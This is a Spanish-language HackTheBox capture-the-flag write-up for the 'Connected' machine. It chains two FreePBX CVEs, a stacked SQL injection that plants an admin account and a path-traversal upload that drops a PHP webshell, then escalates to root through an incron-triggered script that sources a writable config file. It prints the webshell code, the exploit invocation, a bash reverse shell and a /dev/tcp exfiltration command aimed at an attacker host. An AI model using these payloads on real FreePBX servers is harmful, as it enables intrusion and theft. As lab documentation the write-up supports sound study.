---
title: "Connected"
date: 2026-06-18
categories: [HackTheBox, Easy]
tags: [linux, FreePBX, SQLi, file upload, incron, CVE, CVE-2025-57819, CVE-2025-61678]
image:
  path: /assets/img/HTB/Connected/banner.png
  alt: Connected writeup
protected: true
---


Explotación encadenada de FreePBX 16.0.40.7: una stacked SQL injection no autenticada (**CVE-2025-57819**) planta una fila de admin recién creada en `ampusers`, y después una subida arbitraria de archivos autenticada (**CVE-2025-61678**) deposita una webshell PHP en el web root vía path traversal en `fwbrand`. La escalada de privilegios pivota sobre un watch de `incron` que ejecuta un script propiedad de root que hace source de un `/etc/dahdi/init.conf` escribible — inyectar un comando en ese archivo y disparar el evento vigilado da ejecución de código como `root`.

| Campo      | Detalles            |
|------------|---------------------|
| Plataforma | HackTheBox          |
| Dificultad | Fácil               |
| SO         | Linux               |
| IP         | 10.129.27.223       |
| Fecha      | Junio 2026          |

## Herramientas utilizadas

| Herramienta         | Descripción                                                                          |
|---------------------|--------------------------------------------------------------------------------------|
| ping                | Utilidad ICMP para verificar la accesibilidad del host                              |
| nmap                | Escáner de puertos e identificación de servicios                                     |
| Navegador web       | Reconocimiento manual del panel de administración de FreePBX y disclosure de versión |
| Python 3 (requests) | Usado para ejecutar la cadena de exploits pública CVE-2025-57819 + CVE-2025-61678   |
| netcat (nc)         | Listener TCP para la reverse shell y después para la exfiltración a ciegas de la flag |
| find                | Enumeración del sistema de archivos para localizar archivos escribibles de grupos privilegiados |
| incron              | Variante de cron dirigida por eventos del sistema de archivos; el vector de la escalada |
| Bash                | Payloads de reverse shell e inyección de comandos en el archivo de configuración sourceado |

## Reconocimiento y enumeración

El objetivo de esta fase era mapear la superficie de ataque e identificar qué servicio expuesto contenía el punto de entrada.

### Descubrimiento del host

La accesibilidad se confirmó con ICMP. El TTL de 63 (el TTL por defecto en Linux es 64, decrementado una vez al cruzar el salto de enrutamiento) dio la pista habitual del SO:

```bash
ping -c 1 10.129.27.223
PING 10.129.27.223 (10.129.27.223) 56(84) bytes of data.
64 bytes from 10.129.27.223: icmp_seq=1 ttl=63 time=43.4 ms
```

### Escaneo de puertos

Un escaneo SYN sobre los 65535 puertos TCP a alta velocidad de paquetes. `-Pn` saltó el descubrimiento de host (ICMP ya probó que estaba vivo) y `-n` deshabilitó el DNS inverso para mantener el escaneo rápido:

```bash
sudo nmap -p- --min-rate 5000 -sS -vvv -Pn -n 10.129.27.223 -oG allPorts
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
Not shown: 65532 filtered tcp ports (no-response)
```

Los 65532 puertos filtrados (en lugar de cerrados) señalaban un firewall basado en host o perimetral descartando silenciosamente los paquetes a todo excepto 22/80/443 — contexto útil, porque descartó encontrar puertos de gestión ocultos.

Le siguió un escaneo dirigido con los scripts por defecto y detección de versiones:

```bash
sudo nmap -p22,80,443 -sCV 10.129.27.223 -oN nmap
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/...
```

Tres detalles importaban. OpenSSH 7.4 es lo bastante antiguo como para ser sospechoso, pero no es directamente explotable sin credenciales, así que SSH se despriorizó. El servidor HTTP es **Apache 2.4.6 sobre CentOS con PHP 7.4.16** — un stack heredado de CentOS 7. Y, críticamente, dos hechos apuntaban directamente a un producto concreto: la redirección a `http://connected.htb/` (virtual hosting basado en nombre) y el `commonName=pbxconnect` del certificado TLS. La subcadena `pbx` sugería con fuerza una centralita privada (PBX) — casi con seguridad **FreePBX**, el producto PBX de código abierto más común.

El dominio se añadió al `/etc/hosts` para que la aplicación resolviera correctamente:

```bash
echo "10.129.27.223 connected.htb" | sudo tee -a /etc/hosts
```

### Aplicación web

Navegar a `http://connected.htb/` cargó la interfaz de administración de FreePBX. El pie revelaba la versión exacta:

![FreePBX 16.0.40.7 admin panel](/assets/img/HTB/Connected/web.png)

```text
FreePBX 16.0.40.7
```

Una versión tan precisa apunta directamente a una búsqueda de CVE conocidos. FreePBX 16.0.40.7 está afectado por **CVE-2025-57819**, una stacked SQL injection no autenticada en el módulo Endpoint Manager que puede encadenarse con **CVE-2025-61678**, una subida arbitraria de archivos autenticada en el uploader de firmware del mismo módulo. La cadena está armada públicamente, incluida una PoC en Python de `0xEHxb` en GitHub que automatiza ambas etapas y deja una webshell de un tirón.

## Explotación

### Visión general de la cadena: CVE-2025-57819 + CVE-2025-61678

Las dos vulnerabilidades son significativas de forma independiente, pero se vuelven decisivas al encadenarse:

**CVE-2025-57819** vive en el cargador AJAX del módulo endpoint en `/admin/ajax.php`. El parámetro `brand` se concatena en una consulta SQL sin parametrización, y como el conector subyacente soporta **stacked queries** (múltiples sentencias separadas por `;` en una sola petición), un atacante puede añadir SQL arbitrario — incluidas sentencias `INSERT` contra la tabla `asterisk.ampusers` que almacena las credenciales de admin. El bug es accesible **sin autenticación**, lo que significa que se puede plantar una cuenta de admin nueva con una única petición GET.

**CVE-2025-61678** es una subida de archivos basada en path traversal autenticada en el uploader de firmware del Endpoint Manager (comando `upload_cust_fw`). El parámetro `fwbrand` está pensado para namespacing de las subidas bajo `/tftpboot/customfw/<brand>/`, pero acepta secuencias `../`, así que un valor como `../../../var/www/html/<dir>` escribe el archivo subido directamente en el web root de Apache. Combinado con que el archivo puede tener cualquier extensión que el atacante elija (sin validación de MIME), esto es un drop directo de webshell PHP.

La cadena se lee por tanto: **inyectar admin vía SQLi → loguearse como ese admin → subir shell PHP al web root → ejecutar comandos**. La PoC de `0xEHxb` (`FreePBX-CVE-2025-57819-RCE`) implementa exactamente este flujo.

### Ejecutando el exploit

La PoC acepta parámetros de objetivo y de reverse shell; con un listener de netcat preparado en el lado del atacante, una única invocación maneja ambas CVE y dispara la conexión de vuelta:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
```

```bash
python3 exploit.py --rhost connected.htb --lhost <ATTACKER_IP> --lport 4444
[*] [CVE-2025-57819] creating admin via stacked SQLi: svc_xxxxx:xxxxxxxxxxxx
[+] admin row inserted into ampusers
[*] logging into FreePBX admin panel
[+] authenticated as svc_xxxxx
[*] [CVE-2025-61678] uploading webshell -> /<rnd>/<rnd>.php
[+] webshell live: https://connected.htb/<rnd>/<rnd>.php
[*] firing reverse shell -> <ATTACKER_IP>:4444
```

Internamente, el paso de SQLi emite un `DELETE` (por idempotencia) y un `INSERT` en `ampusers` con la contraseña del usuario hasheada en SHA-1 y el valor de sección `0x2a` (`*`, que significa todas las secciones de FreePBX). El paso de subida de archivos hace POST a `/admin/ajax.php?module=endpoint&command=upload_cust_fw` con `fwbrand=../../../var/www/html/<dir>` y un cuerpo de archivo PHP de `<?php system($_REQUEST["cmd"]); ?>` — una vez escrito, esa ruta es directamente accesible a través de Apache.

El listener recibió la conexión de vuelta como el usuario de servicio **`asterisk`** — la cuenta sin privilegios bajo la que corre FreePBX:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.27.223 41540
bash: no job control in this shell
[asterisk@connected nroee4ivcb]$ whoami
asterisk
```

La shell aterrizó dentro del directorio de nombre aleatorio creado por el paso de subida (`nroee4ivcb`). Una mejora rápida de TTY (`script /dev/null -c bash`, `stty raw -echo; fg`, `reset`) la hizo usable, y la flag de usuario era legible desde el directorio home de `asterisk`:

```bash
cat /home/asterisk/user.txt
```

## Escalada de privilegios — `asterisk` → `root`

Con una shell como `asterisk`, el objetivo era encontrar un camino a root. Las comprobaciones rápidas habituales — `sudo -l`, enumeración de SUID, capabilities — volvieron vacías, así que el siguiente movimiento fue buscar archivos escribibles por el usuario actual que algo más privilegiado pudiera leer o ejecutar. Un `find` dirigido filtrando el ruido de los propios directorios escribibles de FreePBX produjo la pista:

```bash
find /etc -writable 2>/dev/null | grep -v "/etc/wanpipe\|/etc/asterisk\|/etc/schmooze" | head -20
/etc/dahdi/init.conf
```

Un archivo de configuración escribible bajo `/etc/dahdi` (DAHDI es la capa de drivers del kernel que Asterisk usa para hablar con el hardware de telefonía) es exactamente el tipo de archivo que un servicio privilegiado podría leer. La pregunta era *qué* servicio privilegiado y *cuándo*.

### Encontrando el disparador — Incron

En la mayoría de las máquinas de estilo CTF, la respuesta a "qué lee este archivo como root" resulta ser o un trabajo de cron o un servicio de systemd. En esta máquina no era ninguno de los dos — era **incron**, la variante de cron basada en inotify y dirigida por eventos que ejecuta comandos en respuesta a eventos del sistema de archivos (archivo escrito, modificado, borrado, etc.).

Leer la configuración de incron a nivel de sistema reveló la regla:

```bash
cat /etc/incron.d/*
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

La regla se lee: *cuando el archivo `/var/spool/asterisk/sysadmin/dahdi_restart` se cierra después de haber sido escrito (`IN_CLOSE_WRITE`), ejecutar `/usr/sbin/sysadmin_dahdi_restart`*. El script corre como root (las `system tables` de incron bajo `/etc/incron.d/` corren como root por defecto), y el archivo vigilado vive bajo `/var/spool/asterisk/sysadmin/` — un directorio en el que el usuario `asterisk` puede escribir.

Inspeccionar el script propiedad de root reveló lo que hacía esta cadena explotable: entre sus tareas, el script hace **source** de `/etc/dahdi/init.conf` para cargar variables de configuración. Hacer source en Bash (`source <file>` o `. <file>`) no solo parsea pares clave=valor; ejecuta el archivo como un script de shell en el contexto de la shell llamante. Cualquier línea del archivo sourceado que no sea estrictamente una asignación de variable corre como un comando de shell — con los privilegios de quien hizo el source.

La cadena se lee por tanto:

1. `asterisk` escribe un comando en `/etc/dahdi/init.conf` (escribible).
2. `asterisk` escribe cualquier cosa en `/var/spool/asterisk/sysadmin/dahdi_restart` (escribible, y dispara `IN_CLOSE_WRITE`).
3. incron lanza `/usr/sbin/sysadmin_dahdi_restart` **como root**.
4. El script hace source de `/etc/dahdi/init.conf`, ejecutando el comando inyectado **como root**.

### Explotación

El primer intento fue el enfoque de manual — una reverse shell inyectada en la config sourceada:

```bash
echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4445 0>&1" &' >> /etc/dahdi/init.conf
```

El `&` final pone en segundo plano la shell lanzada para que el script de root no se bloquee con ella, lo que de otro modo paralizaría toda la rutina de reinicio y podría levantar alarmas. Se inició un segundo listener:

```bash
nc -lvnp 4445
Listening on 0.0.0.0 4445
```

Y se disparó el trigger:

```bash
echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
```

La reverse shell no conectaba de vuelta de forma fiable — probablemente una combinación del filtrado de salida en el objetivo y de cómo el script sourceado manejaba la semántica de señal/salida alrededor del proceso en segundo plano. En lugar de pelearme con la reverse shell, cambié a **exfiltración a ciegas**: el mismo punto de inyección puede ejecutar *cualquier* comando de root, y netcat reenviará encantado el contenido de archivos arbitrarios sobre una conexión TCP. Reemplazar el payload de reverse shell por una exfil directa con `cat | /dev/tcp/` era más simple y más fiable:

```bash
echo 'bash -c "cat /root/root.txt > /dev/tcp/<ATTACKER_IP>/4445" &' >> /etc/dahdi/init.conf
echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
```

En el lado del atacante, el listener capturó el contenido de la flag directamente:

```bash
nc -nlvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.129.27.223 54888
<root.txt content>
```

Esto merece destacarse como técnica en sí misma. Cuando una escalada por command injection te da ejecución como root pero las reverse shells se portan mal, en realidad no necesitas una shell interactiva para ganar — solo necesitas la **flag** (o el archivo concreto que requiera el engagement). Un `cat > /dev/tcp/...` de un solo disparo es más difícil de romper y produce un evento de red limpio y predecible.

## Flags

| Flag     | Valor      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Conclusiones clave

- **Los banners de versión públicos en stacks heredados son una escalada servida en bandeja.** La combinación de Apache 2.4.6, PHP 7.4.16, un SO de la era CentOS y un disclosure preciso de la versión 16.0.40.7 de FreePBX llevó el engagement de "vamos a enumerar" a "vamos a elegir la cadena de CVE" en menos de un minuto. Ninguno de esos números necesitaba estar expuesto públicamente.
- **El disclosure de versión estilo `X-Powered-By` se potencia con CVE encadenadas.** CVE-2025-57819 por sí sola te da una escritura en la base de datos; CVE-2025-61678 por sí sola necesita una sesión autenticada. La cadena es lo letal, y la cadena solo es obvia una vez que el banner de versión identifica a ambas como dentro del alcance.
- **Los archivos de configuración sourceados son sumideros de command injection por diseño.** Cualquier script de shell que hace `source /path/to/some.conf` está, semánticamente, ejecutando ese archivo. Si el archivo es escribible por un principal menos privilegiado que el que corre el script, la cadena ya está rota — no hay defensa del tipo "pero solo lee variables", porque Bash no distingue en tiempo de parseo.
- **Incron es la tercera opción fácil de pasar por alto.** Las herramientas de enumeración para escalada de privilegios (LinPEAS, linpriv, etc.) sí comprueban las tablas de incron, pero los operadores a veces se olvidan de él porque es menos común que cron y systemd. `cat /etc/incron.d/*` y `cat /var/spool/incron/*` pertenecen a toda checklist de privesc de Linux.
- **No siempre necesitas una shell — necesitas el artefacto.** Cuando las reverse shells se portan mal en un objetivo con egress restringido, la exfiltración de un solo disparo del archivo concreto que necesitas (`cat /root/root.txt > /dev/tcp/...`) es más rápida, más fiable y a menudo más silenciosa que intentar depurar interacciones de TTY/pipe sobre un canal de command injection poco fiable.
